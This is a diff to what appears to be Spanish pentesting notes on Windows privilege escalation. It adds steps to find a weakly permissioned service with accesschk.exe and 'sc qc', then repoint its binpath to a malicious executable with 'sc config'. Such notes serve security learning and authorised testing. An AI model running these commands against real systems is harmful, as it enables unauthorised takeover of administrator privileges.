@@ -21,6 +21,15 @@ GetAppLockerPolicy == https://docs.microsoft.com/en-us/powershell/module/applock
 LISTAR USUARIOS =  net user
 
 Explotación de servicios con permisos inseguros:
+Luego de listar los servicios corriendo en el servidor podemos consultar por medio de la herramienta accesschk.exe (tenemos que introducirla en el sistema) los permisos que tiene el user sobre la misma con el comando:
+accesschk.exe /accepteula -uwcqv USUARIO_EN_USO SERVICIO_A_CONSULTAR
 
+si la opción SERVICE_CHANGE_CONFIG se encuentra dentro de RW(read and write)
+Podremos modificar su configuración.
 
+Podemos hacer una query al servicio para ver con qué privilegios/user corre con el comando:
+sc qc servicio
 
+Si el servicio corre con usuarios administradores o super usuarios nos es propicio para ser utilizado para elevar privilegios:
+modificaremos el BINPATH del mismo para que al momento de ser ejecutado, llame a un nuevo proceso o programa malicioso.
+sc config daclsvc binpath= "\"C:\PATH\TO\MALICIOUS.exe""
